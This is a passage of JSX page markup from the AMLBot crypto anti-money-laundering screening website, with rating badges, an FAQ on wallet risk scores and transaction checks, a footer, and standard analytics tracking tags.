                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#D9D9D9"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 23.187793 46.330002 23.187793 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                        </div>
                                        <div className="to5cY5"><b>4.5</b> out of 5</div>
                                    </div>
                                </a></div>
                                <div className="Uz3_Ic">
                                    <div className="HtuBmR">We are trusted members of</div>
                                    <ul className="qQncdT">
                                        <li><img alt="International Association for Trusted Blockchain Applications"
                                                 loading="lazy"
                                                 width="64" height="64" decoding="async" data-nimg="1"
                                                 style={{color: "transparent"}}
                                                 src="/image/INATBA.png"/><span>INATBA</span>
                                        </li>
                                        <li><img alt="Crypto Defenders Alliance" loading="lazy" width="64" height="64"
                                                 decoding="async" data-nimg="1" style={{color: "transparent"}}
                                                 src="/image/CDA.png"/><span>CDA</span>
                                        </li>
                                        <li><img alt="Anti-Human Trafficking Intelligence Initiative" loading="lazy"
                                                 width="64"
                                                 height="64" decoding="async" data-nimg="1" style={{color: "transparent"}}
                                                 src="/image/ATII.png"/><span>ATII</span>
                                        </li>
                                        <li><img alt="League for Security in the Web3" loading="lazy" width="64"
                                                 height="64"
                                                 decoding="async" data-nimg="1" style={{color: "transparent"}}
                                                 src="/image/LSW3.png"/><span>LSW3</span>
                                        </li>
                                        <li><img alt="EU Blockchain Association" loading="lazy" width="64" height="64"
                                                 decoding="async" data-nimg="1" style={{color: "transparent"}}
                                                 src="/image/EUBA.png"/><span>ЕВА</span>
                                        </li>
                                        <li><img alt="FinTech Association of Hong Kong" loading="lazy" width="200"
                                                 height="200"
                                                 decoding="async" data-nimg="1" style={{color: "transparent"}}
                                                 src="/image/FTAHK.png"/><span>FTAHK</span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <section className="VzoaWq DyMfb_">
                        <div className="b_L6f_">
                            <div className="o4syl7">
                                <div className="q57VaS _5zZKyX _LNaGn aos-init aos-animate" data-aos="fade-up">
                                    <div className="lGVdcF">
                                        <div className="ga95vF"><h3 className="gsoLYE NYk8Bp">+$100 000 000</h3></div>
                                        <p className="N4mo6s">Amount of the risky funds detected</p></div>
                                </div>
                                <div className="q57VaS _5zZKyX _LNaGn aos-init aos-animate" data-aos="fade-up"
                                     data-aos-delay="100">
                                    <div className="lGVdcF">
                                        <div className="ga95vF">
                                            <div className="_1mVFjs">
                                                <div><img alt="Binance" loading="lazy" width="140" height="29"
                                                          decoding="async"
                                                          data-nimg="1" style={{color: "transparent"}}
                                                          src="/image/binance.svg"/></div>
                                                <div><img alt="OKX" loading="lazy" width="72" height="29"
                                                          decoding="async"
                                                          data-nimg="1" style={{color: "transparent"}}
                                                          src="/image/okx.svg"/></div>
                                                <div><img alt="Huobi" loading="lazy" width="88" height="29"
                                                          decoding="async"
                                                          data-nimg="1" style={{color: "transparent"}}
                                                          src="/image/huobi.svg"/></div>
                                            </div>
                                        </div>
                                        <p className="N4mo6s">Compliance departments that accept our AML procedures</p>
                                    </div>
                                </div>
                                <div className="q57VaS _5zZKyX _LNaGn aos-init aos-animate" data-aos="fade-up"
                                     data-aos-delay="200">
                                    <div className="lGVdcF">
                                        <div className="ga95vF"><h4 className="gsoLYE">60,000+</h4></div>
                                        <p className="N4mo6s">Service providers checked</p></div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section className="JCqsM_" id="faq">
                        <div className="b_L6f_">
                            <div className="xb1dXH"><h2 className="dc_GNJ aos-init aos-animate" data-aos="fade-up">FAQs</h2>
                            </div>
                            <div className="_9SfPwg">
                                <div className="_PiqMG aos-init aos-animate" data-aos="fade-up"><h3 className="Fl3Ugx">Is your
                                    question not on the
                                    list?</h3>
                                    <p className="_636_tF">Contact us via messenger. We are in touch <b>24/7</b>, so any
                                        issue can be
                                        resolved quickly and in a live chat format.</p>
                                    <button type="button" className="MZR5Z_">
                                        <div className="fWkT8f">
                                            <svg className="icon icon-helpcrunch">
                                                <use xmlnsXlink="http://www.w3.org/1999/xlink"
                                                     xlinkHref="#icon-helpcrunch"></use>
                                            </svg>
                                        </div>
                                        <div className="h165hA"><h4>We're in messenger</h4>
                                            <p>We will answer within 30 seconds</p></div>
                                    </button>
                                    <p className="_9yCvRy"><small>It may take a little longer to respond during the
                                        night.</small></p>
                                </div>
                                <div className="e5xgXj aos-init aos-animate" data-aos="fade-up" data-aos-delay="50">
                                    <div className="">
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">What does the AMLBot check show?</div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">The basic AMLBot check result includes risk
                                                        score
                                                        percentage, sources of risk, and belonging to the
                                                        blacklist.<br/><br/> In
                                                        addition, the check result may include various optional
                                                        information about
                                                        the address, such as belonging to the cluster, actual balance,
                                                        and
                                                        transferred funds amount.<br/><br/> The check result may be
                                                        incomplete in
                                                        relation to the described data if the necessary information is
                                                        missing.<br/><br/> Please note that for blockchains that are in
                                                        the limited
                                                        mode, clustering and percentage value of the check risk score
                                                        are not
                                                        available. A risk score can be provided for a counterparty only
                                                        if it
                                                        relates to an entity.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">What does the percentage risk score
                                                mean?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">The overall risk score (percentage) is the
                                                        probability that
                                                        the address is associated with illegal
                                                        activity.<br/><br/> AMLBot finds
                                                        connections of a checked address to other addresses on the
                                                        blockchain and
                                                        with entities of different categories, each with a different
                                                        conditional
                                                        risk score, and calculates the overall risk score based on those
                                                        connections.<br/><br/> The overall risk score calculation takes
                                                        into account
                                                        the risk severity of connections found. For example, in the case
                                                        of
                                                        connections to entity categories Mining (0% risk) and Darknet
                                                        (100% risk),
                                                        the risk impact of Darknet, as a more risky category, will be
                                                        higher, and
                                                        Mining will have less weight in the risk assessment.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">What do the sources of risk mean?</div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">AMLBot checks the specified wallet address for
                                                        connections
                                                        to known blockchain services - entities. AMLBot conventionally
                                                        groups these
                                                        services into groups with different risk levels of illegal
                                                        activity - entity
                                                        categories.<br/><br/> The AML check shows the connections of the
                                                        checked
                                                        address to these entity categories as the sources of risk, with
                                                        which the
                                                        address interacted, and the percentage of funds transferred
                                                        from/to these
                                                        services.<br/><br/> Based on all the sources of risk, an overall
                                                        risk score is
                                                        calculated, which helps the user to make further decisions about
                                                        the assets.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">What is the difference between an address
                                                and a
                                                transaction checks?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">An address check is an analysis of all its
                                                        connections to
                                                        other addresses and entities on blockchains, considering
                                                        incoming and
                                                        outgoing funds movement.<br/><br/> A transaction check process
                                                        differs from
                                                        the address check, and the result depends on your side in the
                                                        transaction.
                                                        The overall risk score always relates to the
                                                        counterparty.<br/><br/> To check
                                                        a transaction you need to specify the TxID and the destination
                                                        address of
                                                        the transaction and select your side in the transaction:<br/> -
                                                        Recipient
                                                        (you got a deposit to your wallet) - the addresses from which
                                                        the funds were
                                                        received are checked. The sources of risk describe the services
                                                        from which
                                                        the TX senders accumulated the transferred funds with a
                                                        percentage
                                                        breakdown.<br/> - Sender (you made a withdrawal from your
                                                        wallet) - the
                                                        wallet that received the funds is checked. The sources of risk
                                                        describe all
                                                        connections of the recipient address with a percentage
                                                        breakdown.<br/><br/>
                                                        Thus, when checking a transaction, the risks for the recipient
                                                        are checked
                                                        if you receive funds, and the risks for the sender if you send
                                                        funds.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">How do I understand risk assessment?</div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">Each client determines for himself what
                                                        percentage of risk
                                                        is acceptable for him. Conventionally, the risk score can be
                                                        divided as
                                                        follows:
                                                        <br/>
                                                        - 0-25% is a clean wallet/transaction;
                                                        <br/>
                                                        - 25-75% is the average level of risk;
                                                        <br/>
                                                        - 75%+ such a wallet/transaction is considered risky.
                                                        <br/>
                                                        It is also worth paying attention to the red sources of risk in
                                                        the detailed
                                                        analysis, described in <a
                                                            href="https://amlbot.com/what-do-we-analyze">page
                                                        </a></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">What cryptocurrencies does AMLBot
                                                analyze?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">AMLBot supports all major blockchains and
                                                        tokens on them.
                                                        We are constantly adding support for additional
                                                        cryptocurrencies. You can
                                                        always check the up-to-date list of supported cryptocurrencies
                                                        in
                                                        <a href="http://web.amlbot.com" target="_blank">
                                                            web dashboard
                                                        </a>
                                                        or in
                                                        <a href="https://docs.amlbot.com/" target="_blank">
                                                            API Documentation
                                                        </a>
                                                        .
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">How does AMLBot help to protect you
                                                against
                                                blocking?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">By checking counterparties' wallets before a
                                                        transaction,
                                                        you can reject their assets if the risk score is high. Also,
                                                        before
                                                        transferring funds to other services, you can check your wallet
                                                        address and
                                                        save the result (make a screenshot).<br/><br/> If the check
                                                        shows that your
                                                        assets had no connection with illegal activity and the service
                                                        blocked you,
                                                        you can provide the saved result to confirm the purity of your
                                                        assets.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">The risk is higher than 50%, but I am
                                                certain that the
                                                address is reliable. What to do?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">The check results are based on the
                                                        international databases,
                                                        which are constantly updated. So an address that had 0% risk
                                                        yesterday may
                                                        have received or given the asset to a risky counterparty today.
                                                        In this
                                                        case, the risk score will change. If you want to be sure of the
                                                        result and
                                                        determine what the cause of the high risk is, we can do a
                                                        detailed check for
                                                        you. To do it, email us at <a href="mailto:info@amlbot.com">
                                                            info@amlbot.com</a></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">How often are checks recommended to do?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">An answer to this question depends on your
                                                        unique risk
                                                        model. The general recommendation would be to perform an AML
                                                        check every
                                                        time you interact with an unknown wallet or a smart contract.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">How quickly is the balance replenished?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">After transaction confirmation, the balance is
                                                        replenished:
                                                        <br/> • up to 10 minutes if the payment was made within 24 hours
                                                        after the
                                                        invoice was issued, <br/> • up to 25 minutes if the payment was
                                                        made after 24
                                                        hours after the invoice issuance. Overall, BTC, ETH, USDT, and
                                                        fiat are
                                                        processed faster than other cryptocurrencies.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">What happens if I don't use all my checks
                                                each
                                                month?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">If you purchased checks without expiration date
                                                        - they
                                                        remain in your account, and you can use them at any
                                                        time.<br/><br/> If you
                                                        purchased checks with a time limit - they will be deducted from
                                                        your account
                                                        after expiration date.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">What if I will need more checks?</div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">You can buy additional checks as needed. The
                                                        number of
                                                        checks is always displayed within your user information.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="_Ul5cK">
                                            <div role="button" className="paUd7O">How does AMLBot ensure data protection?
                                            </div>
                                            <div className="ORhlBm" style={{height: "0px", transition: "0.25s"}}>
                                                <div>
                                                    <div className="_9ZTzQc">AMLBot safeguards data by adhering to rigorous
                                                        standards,
                                                        as validated by our ISO 9001 and ISO 27001 certifications. <br/><br/>Our
                                                        ISO
                                                        9001 certification highlights our commitment to delivering
                                                        consistent
                                                        quality and enhancing customer satisfaction. More crucially, our
                                                        ISO 27001
                                                        certification demonstrates our dedication to maintaining high
                                                        standards of
                                                        information security, ensuring the protection of sensitive data,
                                                        and
                                                        achieving regulatory compliance.<br/><br/> Learn more about our
                                                        certifications
                                                        <a href="https://amlbot.com/certifications">here</a>.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
                <footer className="_99rnTN SPTTmA">
                    <div className="b_L6f_">
                        <div className="gsp1gS">
                            <div className="_0xfACM">
                                <div className="mwrkyb">
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 160 33" xlinkTitle="AMLBot"
                                         aria-label="AMLBot" className="vChn_I" style={{width: "100%", height:"auto"}}>
                                        <path fill="#fff"
                                              d="M39.545 29h-6.818l7.681-23.273h8.637L56.727 29h-6.819l-5.09-16.864h-.182L39.545 29Zm-1.273-9.182H51.09v4.727H38.272v-4.727ZM58.968 5.727h7.864L72.24 18.91h.272l5.41-13.182h7.863V29h-6.182V15.545h-.181L74.24 28.818h-3.728l-5.181-13.364h-.182V29h-6.182V5.727ZM88.78 29V5.727H95.1v18.182h9.409v5.09H88.781ZM107.062 29V5.727h10.091c1.772 0 3.261.239 4.466.716 1.212.477 2.125 1.151 2.738 2.023.621.87.932 1.897.932 3.08 0 .855-.189 1.636-.568 2.34a5.016 5.016 0 0 1-1.568 1.773c-.675.47-1.462.795-2.364.977v.227c1 .038 1.909.292 2.727.762a5.221 5.221 0 0 1 1.955 1.92c.485.81.727 1.765.727 2.864 0 1.273-.333 2.405-1 3.398-.659.992-1.598 1.772-2.818 2.34-1.22.569-2.674.853-4.364.853h-10.954Zm6.318-5.046h2.955c1.06 0 1.856-.197 2.386-.59.53-.402.795-.993.795-1.773 0-.546-.125-1.008-.375-1.387-.25-.378-.606-.666-1.068-.863-.454-.197-1.004-.296-1.648-.296h-3.045v4.91Zm0-8.818h2.591c.553 0 1.042-.087 1.466-.261.424-.175.754-.425.988-.75.243-.334.364-.739.364-1.216 0-.72-.258-1.27-.773-1.648-.515-.386-1.166-.58-1.954-.58h-2.682v4.455ZM136.937 29.318c-1.894 0-3.515-.375-4.864-1.125a7.74 7.74 0 0 1-3.102-3.16c-.72-1.355-1.08-2.927-1.08-4.715 0-1.788.36-3.356 1.08-4.705a7.651 7.651 0 0 1 3.102-3.159c1.349-.757 2.97-1.136 4.864-1.136 1.894 0 3.515.379 4.863 1.136a7.647 7.647 0 0 1 3.103 3.16c.719 1.348 1.079 2.916 1.079 4.704 0 1.788-.36 3.36-1.079 4.716a7.737 7.737 0 0 1-3.103 3.159c-1.348.75-2.969 1.125-4.863 1.125Zm.045-4.636c.531 0 .989-.178 1.375-.534.387-.357.686-.864.898-1.523.212-.66.318-1.443.318-2.352 0-.917-.106-1.701-.318-2.353-.212-.659-.511-1.166-.898-1.523a1.959 1.959 0 0 0-1.375-.534c-.56 0-1.041.178-1.443.535-.401.356-.708.863-.92 1.522-.213.652-.319 1.436-.319 2.352 0 .91.106 1.694.319 2.353.212.659.519 1.166.92 1.523.402.356.883.534 1.443.534ZM158.937 11.545v4.546h-11.5v-4.546h11.5Zm-9.273-4.182h6.273v16.023c0 .243.041.447.125.614.083.159.212.28.386.363.174.076.398.114.671.114.189 0 .409-.023.659-.068.257-.046.447-.083.568-.114l.909 4.41c-.28.083-.682.185-1.205.306-.515.121-1.128.2-1.84.239-1.44.076-2.648-.072-3.625-.443-.978-.38-1.713-.974-2.205-1.784-.492-.811-.731-1.826-.716-3.046V7.363Z"></path>
                                        <path fill="#fff" fill-rule="evenodd"
                                              d="M14.555 1.543c-1.43-2.105-4.566-2.046-5.915.112L.531 14.63a3.49 3.49 0 0 0 .037 3.759l8.487 13.014c1.39 2.13 4.526 2.13 5.915 0l8.462-12.975a3.49 3.49 0 0 0-.036-3.87L14.555 1.543Zm.968 7.687c-.305 5.437-4.595 9.816-10.012 10.294l6.502 9.97 8.462-12.974-4.952-7.29Z"
                                              clip-rule="evenodd"></path>
                                    </svg>
                                </div>
                                <div className="EOxXQw"><p><b>Safelement Limited,</b></p>
                                    <p>Office 1111, Suite 1102, Lee Garden One, 33 Hysan Avenue, Causeway Bay, Hong
                                        Kong</p></div>
                            </div>
                            <div className="TGa6sT">
                                <div className="j8Gu_5"><a target="_blank" href="https://amlbot.com/certifications"><img
                                    alt="ISO 9001:215"
                                    loading="lazy" width="120"
                                    height="120" decoding="async"
                                    data-nimg="1"
                                    style={{color: "transparent"}}
                                    src="/image/iso.svg"/></a><a
                                    target="_blank" href="https://amlbot.com/certifications"><img alt="ISO 27001:2017"
                                                                                                  loading="lazy"
                                                                                                  width="120"
                                                                                                  height="120"
                                                                                                  decoding="async"
                                                                                                  data-nimg="1"
                                                                                                  style={{color: "transparent"}}
                                                                                                  src="/image/iso.svg"/></a>
                                </div>
                                <a target="_blank" className="wIL4xY lZlhxp y_16nq F9reqP"
                                   href="https://trustpilot.com/review/amlbot.com"><img alt="Trustpilot" loading="lazy"
                                                                                        width="126"
                                                                                        height="31" decoding="async"
                                                                                        data-nimg="1"
                                                                                        className="EFniD4"
                                                                                        style={{color: "transparent"}}
                                                                                        src="/image/trust.svg"/>
                                    <div className="SY9kc_">
                                        <div className="E6G38x">
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                            <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                 xmlnsXlink="http://www.w3.org/1999/xlink"><title>Trustpilot</title>
                                                <polygon fill="#1D1D1D"
                                                         points="0 46.330002 46.375587 46.330002 46.375587 0 0 0"></polygon>
                                                <polygon fill="#219654"
                                                         points="0 46.330002 23.187793 46.330002 23.187793 0 0 0"></polygon>
                                                <path
                                                    d="M39.532606,19.711433 L13.229706,38.800651 L17.067125,27.002824 L7.019821,19.711433 L19.438795,19.711433 L23.276213,7.912809 L27.113631,19.711433 L39.532606,19.711433 L39.532606,19.711433 Z M23.27717,31.510075 L30.460765,30.000499 L33.322879,38.800651 L23.27717,31.510075 Z"
                                                    fill="#FFFFFF"></path>
                                            </svg>
                                        </div>
                                        <div className="to5cY5"><b>4.5</b> out of 5</div>
                                    </div>
                                </a></div>
                        </div>
                        <div className="wSGqsr">
                            <div className="qbxdE2">
                                <div className="f1E3Tw">For business</div>
                                <ul className="kKi77y">
                                    <li><a className="gDDzrm" href="https://amlbot.com/api-integration">KYT</a></li>
                                    <li><a className="gDDzrm" href="https://amlbot.com/kyc">KYC</a></li>
                                    <li><a className="gDDzrm" href="https://amlbot.com/pro"><span>AMLBot</span>
                                        <svg className="icon icon-pro _R9D9B">
                                            <use xmlnsXlink="http://www.w3.org/1999/xlink"
                                                 xlinkHref="#icon-pro"></use>
                                        </svg>
                                    </a></li>
                                    <li><a className="gDDzrm" href="https://amlbot.com/training">AML Training</a></li>
                                    <li><a className="gDDzrm"
                                           href="https://amlbot.com/crypto-compliance-consulting">Consulting</a></li>
                                </ul>
                            </div>
                            <div className="qbxdE2">
                                <div className="f1E3Tw">For personal use</div>
                                <ul className="kKi77y">
                                    <li><a className="gDDzrm" href="https://amlbot.com/crypto-checker">AML Chat Bot</a></li>
                                    <li><a target="_blank" className="gDDzrm" href="https://amlbot.com/redirect/app">Mobile
                                        App</a></li>
                                    <li><a className="gDDzrm" href="https://amlbot.com/reclaim-crypto">Investigation</a>
                                    </li>
                                </ul>
                            </div>
                            <nav className="WeaO9p">
                                <div className="f1E3Tw">Company</div>
                                <ul className="kKi77y">
                                    <li><a className="gDDzrm" href="https://amlbot.com/about-us">About Us</a></li>
                                    <li><a className="gDDzrm" href="https://amlbot.com/what-do-we-analyze">Analysis</a></li>
                                    <li><a className="gDDzrm" href="https://amlbot.com/certifications">Certifications</a>
                                    </li>
                                    <li><a className="gDDzrm" href="https://blog.amlbot.com">Blog</a></li>
                                    <li><a className="gDDzrm" href="https://amlbot.com/press-kit">Press kit</a></li>
                                </ul>
                            </nav>
                        </div>
                        <div className="_8yyV1L">
                            <div className="to2XVo">2025AMLBot</div>
                            <a rel="nofollow" className="e4Ejat" href="https://t.me/amlbot_support_bot">
                                <svg className="icon icon-telegram">
                                    <use xmlnsXlink="http://www.w3.org/1999/xlink" xlinkHref="#icon-telegram"></use>
                                </svg>
                                Support</a>
                            <nav className="_2sMxxz"><a target="_blank" className="lmFR8X"
                                                        href="https://amlbot.com/files/AMLBot_SERVICE_AGREEMENT.pdf"
                                                        data-lf-fd-inspected-xbp1oaemxxgaedvj="true">
                                <svg className="icon icon-pdf">
                                    <use xmlnsXlink="http://www.w3.org/1999/xlink" xlinkHref="#icon-pdf"></use>
                                </svg>
                                <span>User Agreement</span></a><a className="lmFR8X"
                                                                  href="https://amlbot.com/privacy-policy">Privacy
                                Policy</a></nav>
                        </div>
                    </div>
                </footer>
            </div>
            <iframe height="1" width="1"
                    style={{position: "absolute", top: "0px", left: "0px", border: "none", visibility: "hidden"}}
                    data-lf-form-tracking-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-yt-playback-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-vimeo-playback-inspected-xbp1oaemxxgaedvj="true"></iframe>
            <div className="ReactModalPortal"></div>
            <div className="ReactModalPortal"></div>
            <div className="ReactModalPortal"></div>
            <div className="ReactModalPortal"></div>
            <div className="ReactModalPortal"></div>
            <div className="ReactModalPortal"></div>
            <div className="ReactModalPortal"></div>
            {/*<next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert"*/}
            {/*                         style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p>*/}
            {/*</next-route-announcer>*/}
            <noscript><img height="1" width="1" style={{display: "none"}}
                           src="https://www.facebook.com/tr?id=877590766007498&amp;ev=PageView&amp;noscript=1"/>
            </noscript>
            <iframe height="0" width="0" style={{display: "none", visibility: "hidden"}}
                    data-lf-form-tracking-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-yt-playback-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-vimeo-playback-inspected-xbp1oaemxxgaedvj="true"></iframe>
            <iframe id="_hjSafeContext_76991245" title="_hjSafeContext" tabIndex={-1} aria-hidden="true"
                    src="about:blank"
                    style={{display: "none", width: "1px", height: "1px", opacity: "0", pointerEvents: "none"}}
                    data-lf-form-tracking-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-yt-playback-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-vimeo-playback-inspected-xbp1oaemxxgaedvj="true"></iframe>
            <div id="batBeacon838549405328" style={{width: "0px", height: "0px", display: "none", visibility: "hidden"}}><img
                id="batBeacon453059379522" width="0" height="0" alt=""
                src="https://bat.bing.com/action/0?ti=97139921&amp;tm=gtm002&amp;Ver=2&amp;mid=ef9784b2-f37f-48cc-8d68-4b39ddc833e7&amp;bo=1&amp;sid=edaa3d20ee2e11efa9c0814ae4e0df2c&amp;vid=012ca360ea4b11ef9f7235295e1b5d2d&amp;vids=0&amp;msclkid=N&amp;cdl=label_only_1&amp;gtm_tag_source=1&amp;pi=918639831&amp;lg=ru-RU&amp;sw=1496&amp;sh=967&amp;sc=30&amp;tl=AML%20%D0%9F%D1%80%D0%BE%D0%B2%D0%B5%D1%80%D0%BA%D0%B0%20%D0%9A%D1%80%D0%B8%D0%BF%D1%82%D0%BE%D0%BA%D0%BE%D1%88%D0%B5%D0%BB%D1%8C%D0%BA%D0%BE%D0%B2%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD%20%7C%20AML%20%D0%91%D0%BE%D1%82%20%D0%B4%D0%BB%D1%8F%20%D0%91%D0%BE%D1%80%D1%8C%D0%B1%D1%8B%20%D1%81%20%D0%9E%D1%82%D0%BC%D1%8B%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5%D0%BC%20%D0%94%D0%B5%D0%BD%D0%B5%D0%B3&amp;p=https%3A%2F%2Famlbot.com%2Fru&amp;r=&amp;lt=827&amp;evt=pageLoad&amp;sv=1&amp;cdb=AQAQ&amp;rn=922837"
                style={{width: "0px", height: "0px", display: "none", visibility: "hidden"}}/></div>
            <iframe data-owner="archetype" title="archetype" style={{display: "none", visibility: "hidden"}}
                    data-lf-form-tracking-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-yt-playback-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-vimeo-playback-inspected-xbp1oaemxxgaedvj="true"></iframe>
            <div className="go2933276541 go2369186930" id="hs-web-interactives-top-anchor">
                <div id="hs-interactives-modal-overlay" className="go1632949049"></div>
            </div>
            <div className="go2933276541 go1348078617" id="hs-web-interactives-bottom-anchor"></div>
            <div id="hs-web-interactives-floating-container">
